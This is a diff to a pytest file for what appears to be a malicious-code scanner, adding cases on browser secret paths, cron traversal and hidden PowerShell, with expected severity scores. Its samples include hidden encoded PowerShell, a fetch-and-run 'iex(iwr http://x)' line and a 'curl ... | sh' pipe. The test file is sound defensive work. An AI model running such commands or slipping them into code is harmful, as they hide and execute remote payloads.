@@ -46,6 +46,16 @@ def test_ordinary_credentials(text):
     assert rules(f"p = '{text}'") == ["credentials"]
 
 
+def test_browser_file_names_in_prose_are_fine():
+    assert rules("# keeps a thread-local state for each request") == []
+    assert rules('"""The local state file on the machine invoking ray"""') == []
+    assert rules("path = os.path.join(profile, 'Local State')") == ["secrets"]
+
+
+def test_cron_in_documentation_is_fine():
+    assert rules("a name such as ``../../etc/cron.d/x`` must be rejected") == []
+
+
 def test_the_word_cookies_is_fine():
     assert rules("from django.contrib.sessions.backends import signed_cookies") == []
     assert rules("SESSION_ENGINE = 'signed_cookies'") == []
@@ -56,7 +66,7 @@ def test_the_word_cookies_is_fine():
     [
         "powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBr",
         "powershell.exe -w h -c iex(iwr http://x)",
-        "pwsh -enc AAAA",
+        "pwsh -w hidden -c Get-Date",
         "powershell -ExecutionPolicy Bypass -File a.ps1",
     ],
 )
@@ -66,12 +76,21 @@ def test_hidden_powershell(text):
 
 def test_plain_powershell_is_fine():
     assert rules("subprocess.run(['powershell', 'Get-ChildItem'])") == []
+    # Azure's SDK runs `pwsh -NonInteractive -EncodedCommand ...` to get a token
+    assert rules("['pwsh', '-NoProfile', '-NonInteractive', '-EncodedCommand', cmd]") == []
 
 
-def test_hidden_powershell_is_critical_at_install():
-    found = check_text("powershell -enc AAAA", "setup.py", install_time=True)
-    assert found[0].critical
-    assert not check_text("powershell -enc AAAA", "a.py")[0].critical
+def test_hidden_powershell_is_critical_at_install_and_weaker_later():
+    hidden = "powershell -w hidden -c iex(x)"
+    found = check_text(hidden, "setup.py", install_time=True)
+    assert found[0].critical and found[0].value == 35
+    later = check_text(hidden, "a.py")[0]
+    assert not later.critical and later.value == 20
+
+
+def test_install_instructions_in_an_error_message_count_for_little():
+    found = check_text("raise SystemExit('run: curl -LsSf https://x.sh/i.sh | sh')", "a.py")
+    assert found[0].rule == "download-exec" and found[0].value == 15
 
 
 @pytest.mark.parametrize(
